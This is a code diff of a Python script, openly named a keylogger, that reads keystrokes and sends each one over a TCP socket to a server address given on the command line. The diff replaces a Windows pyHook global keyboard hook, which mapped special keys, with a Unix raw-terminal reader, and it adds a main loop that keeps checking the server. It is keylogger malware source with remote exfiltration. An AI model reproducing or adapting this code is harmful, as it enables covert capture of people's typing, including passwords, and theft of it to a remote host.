@@ -6,8 +6,8 @@ import socket
 import sys
 import time
 import os
-import pyHook
-import pythoncom
+import tty
+import termios
 
 # the server IP and port
 ip = sys.argv[1]
@@ -29,28 +29,32 @@ def send_keys(keys):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((ip, port))
     s.send(keys)
+    print(f"sent keys: {keys}")
     s.close()
 
-# the keylogger
-def OnKeyboardEvent(event):
-    special_keys = {
-        8: "[BACKSPACE]",
-        13: "[ENTER]",
-        9: "[TAB]",
-        32: " ",
-        27: "[ESC]",
-        20: "[CAPSLOCK]",
-        16: "[SHIFT]",
-        17: "[CTRL]",
-        18: "[ALT]",
-        91: "[WIN]",
-        93: "[WIN]",
-        145: "[SCROLLLOCK]"
-    }
-    key = event.Ascii
-    if key in special_keys:
-        send_keys(special_keys[key])
-    else:
-        send_keys(chr(key))
 
+def keylogger():
+    fd = sys.stdin.fileno()
+    old = termios.tcgetattr(fd)
+    try :
+        tty.setraw(sys.stdin.fileno())
+        while True:
+            try:
+                ch = sys.stdin.read(1)
+                if ch == '\x03':
+                    break
+                send_keys(ch)
+                print(ch,end='',flush=True)
+            except KeyboardInterrupt:
+                break
+    finally:
+        termios.tcsetattr(fd, termios.TCSADRAIN, old)
 
+# main
+if __name__ == "__main__":
+    while True:
+        if check_server():
+            keylogger()
+        else:
+            print("server is down")
+            time.sleep(1)
